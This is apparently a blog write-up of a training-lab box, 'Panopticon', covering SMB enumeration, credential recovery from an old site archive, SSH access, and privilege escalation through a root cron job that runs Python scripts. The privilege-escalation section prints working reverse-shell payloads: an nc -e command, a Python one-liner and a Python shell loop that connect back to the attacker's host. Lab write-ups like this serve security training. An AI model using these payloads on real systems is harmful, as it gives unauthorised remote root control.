---
id: 636
title: 'Wizard Labs &#8211; Panopticon'
date: 2019-04-16T08:32:16+01:00
author: rowbot
layout: post
guid: http://offsecnewbie.com/?p=636
permalink: /2019/04/16/wizard-labs-panopticon/
image: /wp-content/uploads/2019/04/pano-192x250.png
categories:
  - Wizard Labs
---
<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?w=680" alt="" class="wp-image-637" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?w=192 192w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image.png?resize=167%2C300 167w" sizes="(max-width: 192px) 100vw, 192px" data-recalc-dims="1" /><figcaption> <br /><a href="https://labs.wizard-security.net/">https://labs.wizard-security.net</a> </figcaption></figure>
</div>

I found getting the user on this box very easy, I think it took me < 10 minutes. Then after about another 10 minutes I roughly knew what I had to do to get root but for the guts of 3 hours couldn&#8217;t figure out why I wasn&#8217;t getting the cron job to execute my script! I figured it out in the end, I just had to take a step back and re-read the /var/mail/seer log. 

<hr class="wp-block-separator" />

Ran the following nmap scan: nmap -sC -sV -oA all -vv -p- 10.1.1.34. 

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?w=680" alt="" class="wp-image-640" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?w=956 956w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?resize=300%2C76 300w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-2.png?resize=768%2C195 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

What stood out to me was port 80, maybe some interesting directories or a web app attack could be carried out. Port 139 and 445 was SAMBA- always interesting to see what I can access through open shares or vulnerable versions.

Port 80 revealed a website. I didn&#8217;t poke about the website as it looked quite flat, the only entry point was the contact form &#8211; that I could see. I was keen to move on to what I could see from the SAMBA share.

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?w=680" alt="" class="wp-image-643" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?w=899 899w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?resize=300%2C218 300w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-3.png?resize=768%2C558 768w" sizes="(max-width: 680px) 100vw, 680px" data-recalc-dims="1" /></figure>
</div>

I ran smbmap to enumerate the SAMBA share and discover the Public share can be read. <https://guide.offsecnewbie.com/network-pen#smbmap>

<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -H $ip
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.1.1.34...
[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
	Disk                                                  	Permissions
	----                                                  	-----------
	public                                            	READ ONLY
	IPC$                                              	NO ACCESS
</pre>

I discovered a zip file called old-site.zip.

<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -R Public -H $ip <font color="#555753"><b>#Recursively list dirs, and files</b></font>
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.1.1.34...
[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
	Disk                                                  	Permissions
	----                                                  	-----------
	Public                                            	READ ONLY
	.\
	dr--r--r--                0 Sun Jun 17 16:17:11 2018	.
	dr--r--r--                0 Sat Feb 24 19:27:52 2018	..
	-r--r--r--           427943 Sat Feb 24 19:57:46 2018	old-site.zip
</pre>

I downloaded it. As you can see smbmap is a nice little tool. I prefer it to enum4linux &#8211; though enum4linux does a few different things.

<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">smbmap</font> -R Public -H $ip -A old-site.zip -q <font color="#555753"><b>#downloads a file in quiet mode</b></font>
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.1.1.34...
[+] IP: 10.1.1.34:445	Name: panopticon.wl                                     
	Disk                                                  	Permissions
	----                                                  	-----------
	[+] Match found! Downloading: Public\.\old-site.zip
	Public                                            	READ ONLY
	[+] Starting search for files matching 'old-site.zip' on share Public.
	[+] Match found! Downloading: Public\old-site.zip
</pre>

I knew that I there would be a config file which I could get a password or user from. So I unzipped the file.<figure class="wp-block-image">

<img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?w=680" alt="" class="wp-image-661" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?w=598 598w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-4.png?resize=300%2C236 300w" sizes="(max-width: 598px) 100vw, 598px" data-recalc-dims="1" /> </figure> <figure class="wp-block-image"><img src="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?w=680" alt="" class="wp-image-662" srcset="https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?w=574 574w, https://i2.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-5.png?resize=300%2C43 300w" sizes="(max-width: 574px) 100vw, 574px" data-recalc-dims="1" /><figcaption>username and password captured.</figcaption></figure> 

I remembered that there was an ssh port open and tried to login with those creds.

<pre><span style="background-color:#2E3436"> </span><span style="background-color:#2E3436"><font color="#C4A000">⚡ </font></span><span style="background-color:#3465A4"><font color="#2E3436"> ~/Desktop/panopticon </font></span><font color="#3465A4"></font> <font color="#4E9A06">ssh</font> seer@$ip                                                              
seer@10.1.1.34';s password: 
Linux Panopticon 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
&lt;mark>You have new mail.&lt;/mark>
Last login: Sun Dec  2 09:18:32 2018 from 10.253.1.0
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ cat /home/seer/user.txt 
6d3934480b23c0ca3d164cf19fa11946
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ 
</pre>

I noticed when I logged in that I received a message that I had new mail. I highlighted it above.  


I knew that mail for the user is located in /var/mail/seer in this instance.  
What does it contain, and who/what sent it? Most often the messages contain output of cron jobs, or a system security report by logwatch, or similar things. Time to read it!

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?w=680" alt="" class="wp-image-668" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?w=676 676w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-6.png?resize=237%2C300 237w" sizes="(max-width: 676px) 100vw, 676px" data-recalc-dims="1" /></figure>
</div>

The mail file was very big 

<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~</b></font>$ ls -la /var/mail/seer 
-rw-rw---- 1 seer mail 23172905 Dec  2 11:36 /var/mail/seer
</pre>

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?w=680" alt="" class="wp-image-671" srcset="https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?w=498 498w, https://i1.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-7.png?resize=300%2C103 300w" sizes="(max-width: 498px) 100vw, 498px" data-recalc-dims="1" /><figcaption>I&#8217;m terrible at reading file sizes and working them out to something I can understand so I turn to Google</figcaption></figure>
</div>

I scrolled through and seen reference to a hidden bash script called .lol.sh

<pre class="wp-block-preformatted">Subject: Cron &lt;root@Panopticon&gt; bash /var/tmp/.lol.sh
</pre>

<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ ls -la /var/tmp/.lol.sh 
-rwx------ 1 root root 125 Jun 27 14:38 <font color="#8AE234"><b>/var/tmp/.lol.sh</b></font>
You have new mail in /var/mail/seer
</pre>

In Seer&#8217;s home directory there was a folder called dev_departement (spelled incorrectly). Maybe the machine&#8217;s author is French?

<div class="wp-block-image">
  <figure class="aligncenter"><img src="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?w=680" alt="" class="wp-image-673" srcset="https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?w=511 511w, https://i0.wp.com/offsecnewbie.com/wp-content/uploads/2019/04/image-8.png?resize=300%2C211 300w" sizes="(max-width: 511px) 100vw, 511px" data-recalc-dims="1" /></figure>
</div> The bad spelling and grammar continues when I looked at dev.txt 🙂 

<pre><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ cat dev.txt 
Hello Seer !! You are the only script developper in this departement ... Like I said you , please drop here all your scripts maybe they can make my life easier :)

Brenda&
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ 
</pre>

So to summarize what I&#8217;ve found. There looks to be a cronjob running which runs a hidden file called .lol.sh of which I am not able to read. There is a file telling me that any scripts I drop into the /home/seer/dev_departement folder will be run. 

This was where I was stuck for a few hours as I looked through the mail file and found a lot of references to a hidden file called .update.sh

<pre class="wp-block-preformatted">Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh Subject: Cron &lt;root@Panopticon> /home/seer/.update.sh <br /><br />From: root@panopticon.panopticon (Cron Daemon) To: root@panopticon.panopticon Subject: Cron &lt;root@Panopticon> /home/seer/update.sh MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit X-Cron-Env: &lt;SHELL=/bin/sh> X-Cron-Env: &lt;HOME=/root> X-Cron-Env: &lt;PATH=/usr/bin:/bin> X-Cron-Env: &lt;LOGNAME=root> Message-Id: &lt;E1epgcw-0000CA-BA@Panopticon.Panopticon> Date: Sat, 24 Feb 2018 21:41:02 +0100 </pre>

I thought that 1) the script had to be hidden and called update.sh and 2) that the script had to be a bash file while also being saved in seer&#8217;s home directory rather than the dev one.

After creating a .sh file with 

<pre class="wp-block-preformatted">nc -e /bin/sh 10.253.0.255 443 </pre>

inside and starting a listener at my end, nothing was coming back. The script was not being run. I went back and forth moving the file to different locations, using different ports, getting the script to wget from my webserver to see if it was running it at all &#8211; nothing! Even confirming that the script was executable.

I reviewed the mail file again and seen this beauty &#8211; highlighted below

<pre>From: root@panopticon.panopticon (Cron Daemon)
To: root@panopticon.panopticon
Subject: Cron &lt;root@Panopticon&gt; &lt;mark> for f in /home/seer/dev_departement/*.py ; do  /usr/bin/python3 "$f" done &lt;/mark>
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Cron-Env: &lt;SHELL=/bin/sh&gt;
X-Cron-Env: &lt;HOME=/root&gt;
X-Cron-Env: &lt;PATH=/usr/bin:/bin&gt;
X-Cron-Env: &lt;LOGNAME=root&gt;
Message-Id: &lt;E1fY9gM-0000EM-02@Panopticon.Panopticon&gt;
Date: Wed, 27 Jun 2018 14:36:22 +0200
</pre>

The script had to be a python script.

I tried using the following script but it didnt work, probably because it needed to be python3

<pre class="wp-block-preformatted"><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ cat script.py 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.253.0.255",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
<font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ 
</pre>

I created a different python script

<pre class="wp-block-preformatted"><font color="#34E2E2"><b>import</b></font> socket
<font color="#34E2E2"><b>import</b></font> subprocess
s=socket.socket()
s.connect((<font color="#8AE234"><b>"10.253.0.255"</b></font>,443))
<font color="#34E2E2"><b>while</b></font> True:
     proc = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     s.send(proc.stdout.read() + proc.stderr.read())
</pre>

<pre class="wp-block-preformatted"><font color="#8AE234"><b>seer@Panopticon</b></font>:<font color="#729FCF"><b>~/dev_departement</b></font>$ ls -la
total 16
drwxrwxrwx 2 root root 4096 Dec  2 13:14 <span style="background-color:#4E9A06"><font color="#3465A4">.</font></span>
drwxr-xr-x 7 seer seer 4096 Jun 27 14:17 <font color="#729FCF"><b>..</b></font>
-rw-r--r-- 1 root root  172 Jun 17 17:34 dev.txt
-rwxr-xr-x 1 seer seer  273 Dec  2 13:02 <font color="#8AE234"><b>script.py</b></font>
</pre>

Started a listener on my machine and got a connection back.

<pre class="wp-block-preformatted">⚡  ~/Desktop/panopticon  nc -lnvp 443  
listening on [any] 443 ...
connect to [10.253.0.255] from (UNKNOWN) [10.1.1.34] 33634
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
8b470f864495744fcd8c3dc7b370e889
</pre>

I wanted to see what was in the .lol.sh 

<pre class="wp-block-preformatted">cat /var/tmp/.lol.sh
cd /home/seer/dev_departement 
for f in *.py; do  # or wget-*.sh instead of *.sh
  python3 "$f"   || break # if needed 
done
</pre>

And there&#8217;s the code that ran the python script in.

So this was a nice easy box to start with and I&#8217;m looking forward to exploring the other boxes that wizard labs have.